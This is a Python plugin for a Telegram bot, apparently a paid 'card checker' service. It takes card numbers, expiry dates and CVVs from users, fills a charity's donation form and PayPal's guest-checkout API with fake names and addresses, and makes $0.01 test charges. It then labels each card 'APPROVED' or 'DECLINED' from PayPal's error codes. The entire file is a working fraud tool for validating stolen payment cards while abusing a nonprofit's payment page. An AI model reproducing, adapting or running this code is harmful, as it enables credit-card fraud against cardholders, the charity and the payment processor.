import requests as r
from src.extras.checklib import MakeGate, ScrapInfo
from datetime import datetime
from src.assets.functions import antispam
from src.assets.connection import Database
from pyrogram.types import Message
from pyrogram import Client, filters, enums
from pyrogram.enums import ParseMode
import string, random, time, rsa, base64, names, json
from requests.exceptions import ProxyError, ConnectionError

name_gate = "Paypal_Charged"
subtype = "$0,1 Charged"
command = "pp"


@Client.on_message(
    filters.command(
        [f"{name_gate}", f"{command}"], ["/", ",", ".", ";", "-"], case_sensitive=False
    )
)
async def gateway(client: Client, m: Message):
    card = (
        m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
    )
    user_id = m.from_user.id
    with Database() as db:
        if not db.IsPremium(user_id):
            return await m.reply("<b>You are not premium</b>", quote=True)
        user_info = db.GetInfoUser(m.from_user.id)
    if not card:
        return await m.reply("You need to provide a card to verify", quote=True)
    antispam_result = antispam(user_id, user_info["ANTISPAM"])
    if antispam_result != False:
        return await m.reply(
            f"Please wait <code>{antispam_result}'s</code>", quote=True
        )
    await client.send_chat_action(m.chat.id, action=enums.ChatAction.TYPING)
    card_splited = MakeGate(card).get_card_details()
    msgg = f"""<b>Checking... 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {card_splited[0]}:{card_splited[1]}:{card_splited[2]}:{card_splited[3]}
<b>Status:</b> Loading..."""
    msg = await m.reply(msgg, quote=True)
    cc_check = await get_live(card, msg)


async def get_live(card, msg):
    card_split = MakeGate(card).get_card_details()
    ccnum = card_split[0]
    mes = card_split[1]
    ano = card_split[2]
    if len(ano) == 2:
        year = f"20{card_split[2]}"
    cvv = card_split[3]
    card_type = card_split[4]

    email = ScrapInfo().email_generator()

    initial_time = time.time()
    data_bin = MakeGate(card).bin_lookup()
    session = ScrapInfo().session()

    max_retries = 3
    retry_delay = 3
    current_time = datetime.now().strftime("%D - %H:%M:%S")

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    headers = {
        "authority": "schoolforstrings.org",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67",
    }

    for retry in range(3):
        try:
            response = session.get(
                "https://schoolforstrings.org/donate/", headers=headers
            ).text
            lines = response.split("\n")
            for i in lines:
                if "gforms_ppcp_frontend_strings" in i:
                    sucio = i
                    create_order_nonce = sucio.replace(
                        "var gforms_ppcp_frontend_strings = ", ""
                    ).replace(";", "")
                    create_order_nonce = json.loads(create_order_nonce)
                    create_order_nonce = create_order_nonce["create_order_nonce"]

            break

        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries - 1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                print("Proxy is not working.")
                session.close()

    msgg = f"""<b>{current_time} 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {ccnum}:{mes}:{ano}:{cvv}
<b>Status:</b> Loading...
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>"""
    await msg.edit_text(msgg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Second request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    headers = {
        "authority": "schoolforstrings.org",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://schoolforstrings.org",
        "referer": "https://schoolforstrings.org/donate/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67",
    }

    params = {
        "action": "gfppcp_create_order",
    }

    json_data = {
        "nonce": create_order_nonce,
        "data": {
            "payer": {
                "name": {
                    "given_name": "Juan",
                    "surname": "Ruiz",
                },
                "email_address": email,
            },
            "purchase_units": [
                {
                    "amount": {
                        "value": "0.01",
                        "currency_code": "USD",
                        "breakdown": {
                            "item_total": {
                                "value": "0.01",
                                "currency_code": "USD",
                            },
                            "shipping": {
                                "value": "0",
                                "currency_code": "USD",
                            },
                        },
                    },
                    "description": "PayPal Commerce Platform Feed 1",
                    "items": [
                        {
                            "name": "Other Amount",
                            "description": "",
                            "unit_amount": {
                                "value": "0",
                                "currency_code": "USD",
                            },
                            "quantity": 1,
                        },
                        {
                            "name": "Other Amount",
                            "description": "",
                            "unit_amount": {
                                "value": "0.01",
                                "currency_code": "USD",
                            },
                            "quantity": 1,
                        },
                    ],
                    "shipping": {
                        "name": {
                            "full_name": "Juan Bermudez",
                        },
                    },
                },
            ],
            "application_context": {
                "shipping_preference": "GET_FROM_FILE",
            },
        },
        "form_id": 6,
        "feed_id": "2",
    }

    for retry in range(max_retries):
        try:
            response = session.post(
                "https://schoolforstrings.org/wp-admin/admin-ajax.php",
                params=params,
                headers=headers,
                json=json_data,
            ).json()
            orderID = response["data"]["orderID"]

            break

        except (ProxyError, ConnectionError) as e:
            if retry < max_retries - 1:
                time.sleep(retry_delay)

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Third request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0",
        "Accept": "*/*",
        "Accept-Language": "es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3",
        "x-country": "US",
        "content-type": "application/json",
        "x-app-name": "standardcardfields",
        "paypal-client-context": orderID,
        "paypal-client-metadata-id": orderID,
        "Origin": "https://www.paypal.com",
        "Connection": "keep-alive",
    }

    data = {
        "query": " mutation payWithCard( $token: String! $card: CardInput! $phoneNumber: String $firstName: String $lastName: String $shippingAddress: AddressInput $billingAddress: AddressInput $email: String $currencyConversionType: CheckoutCurrencyConversionType $installmentTerm: Int ) { approveGuestPaymentWithCreditCard( token: $token card: $card phoneNumber: $phoneNumber firstName: $firstName lastName: $lastName email: $email shippingAddress: $shippingAddress billingAddress: $billingAddress currencyConversionType: $currencyConversionType installmentTerm: $installmentTerm ) { flags { is3DSecureRequired } cart { intent cartId buyer { userId auth { accessToken } } returnUrl { href } } paymentContingencies { threeDomainSecure { status method redirectUrl { href } parameter } } } } ",
        "variables": {
            "token": orderID,
            "card": {
                "cardNumber": ccnum,
                "expirationDate": f"{mes}/{ano}",
                "postalCode": "10080",
                "securityCode": cvv,
            },
            "phoneNumber": f"20{random.randint(0,9)}{random.randint(1700,8065)}{random.randint(8,9)}65",
            "firstName": names.get_first_name(),
            "lastName": names.get_last_name(),
            "billingAddress": {
                "givenName": names.get_first_name(),
                "familyName": names.get_last_name(),
                "line1": "streee 949494u",
                "line2": "",
                "city": "New york",
                "state": "NY",
                "postalCode": "10080",
                "country": "US",
            },
            "shippingAddress": {
                "givenName": names.get_first_name(),
                "familyName": names.get_last_name(),
                "line1": "streee 949494u",
                "line2": "",
                "city": "New york",
                "state": "NY",
                "postalCode": "10080",
                "country": "US",
            },
            "email": email,
            "currencyConversionType": "PAYPAL",
        },
        "operationName": False,
    }

    for retry in range(max_retries):
        try:
            response1 = session.post(
                "https://www.paypal.com/graphql?fetch_credit_form_submit",
                json=data,
                headers=headers,
            )
            response = response1.text
            resp = response1
            break

        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries - 1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)

    final_time = time.time() - initial_time

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Response Code ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    if int(response.find("NEED_CREDIT_CARD")) > 0:
        respuesta = "NON_PAYABLE"
        msgx = "DECLINED ❌"

    elif int(response.find("CANNOT_CLEAR_3DS_CONTINGENCY")) > 0:
        jsonresponse = resp.json()
        message = jsonresponse["errors"][0]["message"]
        msgx = "DECLINED ❌"
        respuesta = message

    elif int(response.find("errors")) > 0:
        jsonresponse = resp.json()
        try:
            code = jsonresponse["errors"][0]["data"][0]["code"]
        except KeyError:
            code = "NULL"
        except IndexError:
            code = "NULL"
        message = jsonresponse["errors"][0]["message"]

        if "INVALID_SECURITY_CODE" in code:
            msgx = "APPROVED CCN ✅"
            respuesta = code

        elif "INVALID_BILLING_ADDRESS" in code:
            msgx = "APPROVED AVS✅"
            respuesta = code

        elif "OAS_VALIDATION_ERROR" in code:
            msgx = "APPROVED ✅"
            respuesta = code

        elif "EXISTING_ACCOUNT_RESTRICTED" in code:
            msgx = "APPROVED ✅"
            respuesta = code

        elif "VALIDATION_ERROR" in code:
            msgx = "APPROVED ✅"
            respuesta = code

        else:
            msgx = "DECLINED ❌"
            respuesta = code

    elif int(response.find("is3DSecureRequired")) > 0:
        msgx = "APPROVED ✅"
        respuesta = "Charge $0,1"

    card_response = f"""<b>#{name_gate} (${command}) 🌩️</b>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccnum}:{mes}:{ano}:{cvv}</code>]
<a href="https://t.me/ByDog3r">↯</a> <b>Status: {msgx}<b>
<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> {respuesta}
<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: {subtype}</b>
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>"""
    await msg.edit_text(
        card_response, parse_mode=ParseMode.HTML, disable_web_page_preview=True
    )
